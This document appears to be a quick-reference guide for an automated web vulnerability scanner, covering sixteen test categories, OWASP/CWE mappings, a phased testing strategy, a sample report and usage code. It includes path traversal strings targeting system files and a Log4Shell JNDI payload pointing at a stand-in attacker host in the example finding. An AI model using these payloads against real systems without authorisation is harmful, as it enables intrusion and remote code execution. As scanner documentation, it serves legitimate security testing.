# Vulnerability Categories Quick Reference

## 16 Test Categories with 50+ Tests

### Overview Table

```
Category              Tests  Severity        Focus Area
────────────────────────────────────────────────────────
1. Injection            4    Critical        SQL, XSS, Command
2. Authentication       3    High            Weak auth, defaults
3. Configuration        3    High            Debug, admin, backup
4. Security Headers     2    Medium          Missing headers, CORS
5. Information Disc.    2    Low             Directory listing
6. Path Traversal      3    Critical        LFI/RFI, log poisoning
7. Access Control      3    Critical        IDOR, privilege esc.
8. Cookie Security     4    High            HttpOnly, Secure, fixation
9. Memory Safety       3    Critical        Buffer/stack overflow
10. Object Reference   3    Critical        IDOR, private vars
11. Enumeration        3    Medium          Account, username, timing
12. Fingerprinting     4    Low             Server, framework, OS
13. File Upload        4    Critical        Extension bypass, shell
14. Request Forgery    4    High            CSRF, spoofing, JSON CSRF
15. AJAX/API           3    High            Endpoint enum, tampering
16. CVE Exploits       4    Critical        Log4Shell, Struts2, etc.
────────────────────────────────────────────────────────
TOTAL:               50+    Comprehensive  All OWASP + CWE coverage
```

## Category Details

### 1. INJECTION (Critical)
- SQL Injection (Basic, UNION)
- XSS (Script, Event Handler)
- **Focus:** Untrusted data execution

### 2. AUTHENTICATION (High)
- Default Credentials
- Weak Password
- Bypass - No Auth
- **Focus:** Weak authentication mechanisms

### 3. CONFIGURATION (High)
- Debug Mode Enabled
- Admin Panel Exposed
- Backup Files
- **Focus:** Insecure default configurations

### 4. SECURITY HEADERS (Medium)
- Missing Headers
- CORS Misconfiguration
- **Focus:** Protective header absence

### 5. INFORMATION DISCLOSURE (Low)
- Directory Listing
- Version Disclosure
- **Focus:** Unintended information exposure

### 6. PATH TRAVERSAL ⭐ NEW (Critical)
- Unix path traversal (../../../../etc/passwd)
- Windows path traversal (..\..\..\windows\win.ini)
- Log file poisoning (../../logs/access.log)
- **Focus:** Absolute path traversal + untrusted data handling

### 7. ACCESS CONTROL ⭐ NEW (Critical)
- ACL Bypass - Direct Reference
- Privilege Escalation
- Function Level Access Control Bypass
- **Focus:** Authorization checks after asset access

### 8. COOKIE SECURITY ⭐ NEW (High)
- Missing HttpOnly Flag
- Missing Secure Flag
- Session Fixation
- Cookie Prediction
- **Focus:** HTTP cookie interception/modification

### 9. MEMORY SAFETY ⭐ NEW (Critical)
- Buffer Overflow
- Stack Overflow
- Uninitialized Pointer
- **Focus:** Memory location access (before/after buffer end)

### 10. OBJECT REFERENCE ⭐ NEW (Critical)
- Insecure Direct Object Reference (IDOR)
- Private Variable Exposure
- Reflection Attack
- **Focus:** Access to critical private variables via public method

### 11. ENUMERATION ⭐ NEW (Medium)
- Account Enumeration
- Username Enumeration
- Timing-Based Enumeration
- **Focus:** Account footprinting + active OS fingerprinting

### 12. FINGERPRINTING ⭐ NEW (Low)
- Server Fingerprinting
- Framework Detection
- OS Fingerprinting
- Technology Stack Disclosure
- **Focus:** Technology identification + OS fingerprinting

### 13. FILE UPLOAD ⭐ NEW (Critical)
- Unrestricted File Upload
- Malicious File in Web Root
- Extension Bypass (Null Byte)
- Double Extension Bypass
- **Focus:** Adding space to extension + malicious file upload

### 14. REQUEST FORGERY ⭐ NEW (High)
- CSRF Token Missing
- Weak CSRF Token
- Action Spoofing
- JSON CSRF
- **Focus:** Adversary-in-the-browser + action spoofing

### 15. AJAX/API ⭐ NEW (High)
- AJAX Endpoint Enumeration
- Unauthenticated API Access
- API Parameter Tampering
- **Focus:** AJAX footprinting + API security

### 16. CVE EXPLOITS ⭐ NEW (Critical)
- CVE-2021-44228 (Log4Shell)
- CVE-2017-5645 (Struts2 OGNL)
- CVE-2022-22965 (Spring4Shell)
- CVE-2014-6271 (Shellshock)
- **Focus:** All known CVEs with automated detection

---

## Proof Points Generated

### By Vulnerability Type

**Path Traversal**
```
- Application accepted path traversal sequences
- System files potentially accessible via traversal
- System configuration files accessible
```

**Access Control**
```
- Authorization checks not properly enforced
- Privilege escalation possible without proper validation
- Access control lists bypassed
```

**Cookie Security**
```
- HttpOnly flag missing - cookies accessible to JavaScript
- Secure flag missing - cookies sent over insecure connections
- Session fixation vulnerability - custom session IDs accepted
```

**Memory Safety**
```
- Application vulnerable to memory corruption
- Buffer boundaries not properly validated
```

**Object Reference**
```
- Direct object references accessible without authorization
- Private variables exposed via public API
```

**Enumeration**
```
- Application reveals information about existing accounts
- Timing-based vulnerabilities in authentication flow
```

**Fingerprinting**
```
- Server technology stack disclosed in responses
- Framework and version information exposed
- Operating system details revealed
```

**File Upload**
```
- Unrestricted file upload vulnerability confirmed
- File extension validation bypassed
- Malicious files uploadable to web-accessible directory
```

**Request Forgery**
```
- CSRF protections not properly implemented
- Cross-site request forgery possible
```

**AJAX/API**
```
- API endpoints vulnerable to unauthorized access
- AJAX requests not properly validated
- All API endpoints discoverable and enumerable
```

**CVE Exploits**
```
- Known CVE vulnerability present in application
- Log4j vulnerable version confirmed
- Apache Struts OGNL injection vulnerability
- Spring Framework classloader injection vulnerability
- Bash ShellShock vulnerability confirmed
```

---

## Testing Strategy

### Phase 1: Reconnaissance
```
Test Categories: fingerprinting
Goal: Identify technology stack
Time: 2-5 minutes
```

### Phase 2: Enumeration
```
Test Categories: enumeration, ajax_api, information_disclosure
Goal: Discover accounts, endpoints, information
Time: 5-10 minutes
```

### Phase 3: Authentication/Authorization
```
Test Categories: authentication, access_control, cookie_security
Goal: Test auth bypass and privilege escalation
Time: 10-15 minutes
```

### Phase 4: Input Validation
```
Test Categories: injection, path_traversal, file_upload
Goal: Test input handling
Time: 10-15 minutes
```

### Phase 5: Business Logic
```
Test Categories: request_forgery, object_reference
Goal: Test state-changing operations
Time: 10-15 minutes
```

### Phase 6: CVE/Advanced
```
Test Categories: cve_exploits, memory_safety
Goal: Test known vulnerabilities
Time: 5-10 minutes
```

### Phase 7: Configuration
```
Test Categories: configuration, headers, cookie_security
Goal: Test hardening measures
Time: 5 minutes
```

---

## Mapping to Frameworks

### OWASP Top 10 2021
- A01:2021 → Injection, Path Traversal, Access Control, Object Reference
- A03:2021 → Injection
- A04:2021 → Memory Safety, File Upload
- A05:2021 → Configuration, Security Headers
- A07:2021 → Authentication, Cookie Security
- A01:2021 → Enumeration, Fingerprinting

### CWE Coverage
- CWE-22 → Path Traversal
- CWE-79 → XSS (Injection)
- CWE-89 → SQL Injection
- CWE-119 → Memory Safety
- CWE-203 → Enumeration
- CWE-284 → Access Control
- CWE-287 → Authentication
- CWE-352 → Request Forgery
- CWE-434 → File Upload
- CWE-639 → Object Reference
- CWE-614 → Cookie Security

---

## Report Output

### For Each Vulnerability Found

```
Finding #1: CVE Detection - Log4Shell

ID: cve_001
Type: CVE Exploit
Severity: Critical
Status: Confirmed
Confidence: 0.95
Source: AI Vulnerability Tester

Description: Log4Shell (CVE-2021-44228) vulnerability detected

Impact: Remote code execution with system privileges

Evidence & Proof Points:
- Known CVE vulnerability present in application
- Log4j vulnerable version confirmed

Proof of Concept:
${jndi:ldap://attacker.com/a}

Remediation:
- Update Log4j to version 2.17.0 or later
- Apply security patches immediately
- Review logs for exploitation attempts
```

---

## Example Usage

### Basic Usage
```python
from ai_vulnerability_tester import AIVulnerabilityTester

tester = AIVulnerabilityTester()
result = tester.test_website('https://target.com')
```

### Comprehensive Testing (All Categories)
```python
categories = [
    'injection', 'authentication', 'configuration',
    'headers', 'information_disclosure', 'path_traversal',
    'access_control', 'cookie_security', 'memory_safety',
    'object_reference', 'enumeration', 'fingerprinting',
    'file_upload', 'request_forgery', 'ajax_api', 'cve_exploits'
]
result = tester.test_website(target, test_categories=categories)
```

### Critical Only
```python
critical = [
    'cve_exploits', 'path_traversal', 'access_control',
    'file_upload', 'memory_safety', 'object_reference'
]
result = tester.test_website(target, test_categories=critical)
```

---

## ⭐ NEW Categories Summary

| Category | Tests | Key Tests | Proof Points |
|----------|-------|-----------|--------------|
| Path Traversal | 3 | LFI/RFI, Log poisoning | System file access |
| Access Control | 3 | IDOR, Privilege esc. | ACL bypass |
| Cookie Security | 4 | HttpOnly, Secure, Fixation | Cookie vulnerabilities |
| Memory Safety | 3 | Buffer/Stack overflow | Memory corruption |
| Object Reference | 3 | IDOR, Private vars | Direct object access |
| Enumeration | 3 | Account, Username, Timing | Account footprinting |
| Fingerprinting | 4 | Server, Framework, OS | Tech stack disclosure |
| File Upload | 4 | Unrestricted, Extension bypass | Malicious file upload |
| Request Forgery | 4 | CSRF, Spoofing, JSON CSRF | State change attacks |
| AJAX/API | 3 | Endpoint enum, Tampering | API/AJAX vulnerabilities |
| CVE Exploits | 4 | Log4Shell, Struts2, Spring, Shellshock | Known CVE detection |

**Total New Tests: 34**
